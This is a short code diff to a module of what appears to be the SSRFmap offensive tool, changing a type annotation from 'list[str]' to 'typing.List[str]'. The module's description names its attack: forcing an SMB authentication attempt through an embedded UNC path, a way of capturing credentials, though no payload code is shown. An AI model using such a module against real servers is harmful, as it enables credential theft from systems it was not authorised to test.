@@ -1,4 +1,5 @@
 import logging
+from typing import List
 
 from ssrfmap.core.utils import wrapper_unc
 
@@ -10,7 +11,7 @@ description = (
     "Force an SMB authentication attempt by embedding a UNC path (\\SERVER\SHARE) "
 )
 author = "Swissky"
-documentation: list[str] = []
+documentation: List[str] = []
 
 
 class exploit:
